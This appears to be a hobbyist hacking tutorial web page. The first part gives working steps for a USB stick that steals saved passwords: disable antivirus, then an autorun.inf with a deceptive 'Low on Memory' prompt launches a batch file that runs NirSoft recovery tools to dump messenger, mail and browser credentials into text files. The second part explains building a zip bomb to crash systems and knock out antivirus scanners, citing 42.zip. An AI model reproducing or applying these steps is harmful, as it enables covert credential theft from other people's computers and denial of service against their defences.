								        <p align="center">There’s a lot of people in the world and even more online accounts.Every security system has a flaw and what we’er going to discuss here is just that.Most people, with their eyes on the clock and not a second to spare just tick <strong>RememberMe</strong> on various websites with out a second thought thinking its going to save their time.This is particularly common among people who have a private system, maybe a laptop that nobody else ever touches or a PC which they have locked with a password.Not knowing that there exist many tools to <strong>recover</strong> saved passwords (more like-to exploit exactly these naive people)Browser store passwords and account details in cookies.What’s quite surprising is just how little security they offer, even worse, none of the browsers seem to care about encrypting passwords.Most of them have an option to “show Saved Password” in the option menu.We’re going to cut even that out , just plug in a <strong>USB</strong> Take it out and <strong>VOILA!</strong> we have all the passwords.That is what you will learn in this tutorial.So with a goal in mind and not a moment to spare, lets get cracking.<br><br>
			                            </p>
								       
		                              <h3 align="center"><strong>Thing's you will need</strong></h3>

		                              <p align="center"><strong>messenpass</strong> is a password recovery tool on several common I.M apps
											<br>
											<strong>mail PassView</strong> small password recovery
											tool for outlook express, windows mail,POP3 etc
											<br>
											<strong>IE Passview </strong>for internet explorer passwords
											<br>
											<STRONG>Protect Storage Pass View(PSPV)</strong>for
											Internet Explorer,Outlook Express, MSN messenger
											<br>
											<strong>Password Fox</strong> - MozillaFox 
											<br>
											www.nirsoft.net for more recovery options!!
											use this for more upto date exe files .
											<br>
											Now we are ready to build a <strong>KeyLogger</strong>
											<br>
		                                    </p>

			                                <p ><strong>Note:</strong>These programs tend to attract a lot of attention from antivirus software <strong>(Get used to this)</strong>.Kindly disable your antivirus before performing these steps, at your own risk of course!.
												<br>
											<strong>1</strong>, First of all download all 5 tools in your USB. Most of them are just some exe.files
											mspass.exe, mailpv.exe, iepv.exe, pspv.exe
											passwordfox.exe
											you need the software complete on the usb drive,make sure all have installation files in the usb(if any)
											<br>
											<strong>2</strong>.create a new notepad and write the following text
											<br>
											[autorun] open=launch.bat
											ACTION=Low on Memory 
											<br>
											Save the note and rename it from New Text Document.txt to autorun.inf
											Now copy the autorun.inf file onto the usb 
											<br><br>
										</p>
											<p aign="center">
											<strong>3</strong>.create another notepad and write the following text onto it
											<br>
											start mspass.exe / stext mspass.txt
											start mailpv.exe / stext mailpv.txt
											start iepv.exe / stext iepv.txt
											start pspv.ex / stext pspc.txt
											start passwordfox.exe / stext passwordfox.txt
											</p>
											<br>
											<strong>4.</strong>Save the note and rename is from the new text document.txt to launch.bat.
											copy launch.bat file also to usb 
											<br>
											what this does is make the usb and auto run drive, it hooks up the launch.bat batch to the autorun.inf file and automatically launches once the key is in the pc. In the lunch.bat we start up our programs and provide them with file names as parameters so that each program should put in the passwords in their respective.txt files.

											<br>
											Now your <strong>U.S.B Password Recovery Tool</strong> All you have to do is insert it in to a PC or LapTop and a popup window will appear and in that window select the option(preform a virus scan) as soon as you will click it , your USB password recovery tool will do its magic and all of the passwords saved on the system will be saved on the .text file. I recommend you try it out on your own system first to see how it should work.
											<br><br>
											<strong>5.</strong>See the last line of the <strong>auto.inf,</strong> we are simply specifying the text for the alert dialog.You can type in anything you think is the best least suspicious.This may not work on all operating systems and all different browsers.Your best bet would be to pack in as many diverse programme as you can for giving you the best chance.Also, note that the computer should not have an auto.run feature disabled for the USB recovery to work.

						        <p align="center">Design to crash & render the system using it 
								                    often deployed to disable antivirus software
													in order to create an opening for more traditional virus . Rather than hijacking the normal operation of the programme , a zip B allows the programme to work as intended, but it archive's this carefully crafted task that unpacking it is, (by a virus scanner to scan it)
													requires inordinate amounts of time,disk space or memory.
                                                    </p>
                                                    <p>The classic zip B is a tiny zip file, most are measured in kilobytes.However, when this file is unzipped its contents are more than what the system can handle (usually unto a petabyte, 1000terabytes, Some go put to exabytes too)
													we are talking about stuffing exabytes of data into kilobytes. in view, this ingenious little trick is the product of pure hacking mentality.
													In essence , its nothing like phishing or session hijacking or anything that has put a bad name on hackers, . Its a simple creative solution, an exploited loophole which truly shows, where there is a will there is a way.
													To understand how it works, we have to take a little detour to see how data compression works 
													(WinZip,WinRar ect)
                                                    </p>
                                                    <p>various compression software and tools make use of whats called, “lossless” compression algorithms”. As the name suggest, these algorithms strive to compress files without any loss of information. Clearly , when we compress a file we’d definitely want to get it back the same way . These algorithms usually exploit statistical redundancy i such a way as to represent the senders data more concisely without error. In english now, We know that computers only understand 0’s and 1’s 
													so every single program or any data stored in your computer is actually just a series of 1’s and 0’s (Binary form) . Take an example that’s not entirely correct but will help you understand the principle.Say we’ve got a file which after being converted to binary language looks like 
													(“1110000101”) Remember statistical redundancy basically means that the same thing is repeated over and over again. In this string we see that there are three 1’s followed by four 0’s . Now take a look at this string:
													“3140101”, What just happened her is compression. we can simply write a program that codes and decodes files as about(Software like WinZip use a fancy form and overly complicated form of what we did about)
													if the program finds repeating patterns, like a lot of 1’s by another number. Another example, we find “111111111” somewhere in a program thats nine 1’s in a row. What if we replace it by 
													“9.1” by writing”1”nine times, effectively reversing the progress. Again while decoding , if the program encounters any number other than 1 or 0 in our case 9,it can be instructed to the successive number, in our case1,9times.So “9,1” gets covered back to “111111111”Thats lossless compression .
                                                    </p>
                                                    <p>what about the previous string(3140101)? On uncompressing this, we get back 1110000101, this is the original string, like i said , this example is not entirely accurate.Note that the computer only understands binary.Everting that you’ll ever do on a computer will have it. at some point, been converted to binary form. Actually the computer is forced to convert to something other than binary(like english) only for us , dumb humans.We compressed “111111111” by writing “9.1” But the “9” in the “9.1” will also have to again be converted into 1’s and 0’s. So our program is quite buggy. Widely used programs like WinZi,Winrar, PowerISO etc, use various different algorithms for different cases.
                                                    </p>
                                                    <p>lossless compression is the possible because most real-world data has statistical redundancy. Lossless compression schemes are reversible so that the original data can be reconstructed . However, lossless data compression algorithms will always fail to compress some files. Indeed any compression algorithms will necessarily fail to compress any dat containing no discernible patterns. Attempts to compress data txt has been compressed already may actually result in an expansion, as will attempt to compress all but the most trivially encrypted data. This is why if you ever tried “wiping” or “Raring” a file you would have noticed in some cases it works great while in others cases it may not ever reduce the file size by 5%(WinRaR and WinZip can be considered the same for (almost) all practical purposes .Their names differ more than their compression abilities ..
                                                    </p>
                                                    <p>ZIP B , the basic meaning , Take a new file text file and write “0” a 1000 times. save it and the file should be just around 1kilobyte. Open it up, CTRL+A, CTRL+C, CTRL+V -i.e, copy the whole thing then paste it. Do it this ten times. Our file is now around 10kb, and completely made of 0’s. Do this a few more times, Faster than your expectations, the file size will quickly climb into megabytes and then gigabytes, in most cases , the notepad (text editor) will actually begin to lag since it has a ridiculous amount of 0’s open in the window. when that happens thats your cue to slow down since different operating systems and software can have unexpected behaviour and when dealing with such large files.Practical , just keep it under a few GB and you should be fine. even this can be to much for some systems, recommend pausing it at 100MB and then slowly increasing the size (IF THE LAG LAST LONGER THAN 15SECONDS YOUR HAVE REACHED YOUR LIMIT) So we have 5GB text file(on an awesome computer) containing nothing but 0’s. A little perspective: thats over five billion zeros that the notepad obediently handles in a few seconds. 
                                                    </p>
                                                    <p>what do will do with this file now, compress it and watch your seriously under appreciated computer do magic. In the same directory, you’ll now see the pointless large text file and alongside ,a zip file that should be under 1 MB. Thats like stuffing 5000balls into a volume of one.
                                                    </p>
                                                    <p>lets get deeper into it, the most famous ZipB the 42.zip file, it is a zip file consisting of 42 KB of nested zip files in sets of 16, each bottoms layer archive containing a 4.3 GB (4 294 967 295 bytes;~3.99GIB) file for a total of 4.5 Petabytes(4 503 599 626 321 920 bytes;~3.99PIB) of uncompressed data. This file is still available for download on various websites across the internet. In many anti-virus scanners , only a few layers of recursion are performed on achieved to help prevent attacks that would cause a buffer overflow, an out of memory condition, or execution time. ZipB often rely on repetition of identical files to achieve their extreme compression ratios. Dynamic programming methods can be employed to limit traversal of such files, so that only one file is followed recursively at each level- effectively converting their exponential growth to linear.
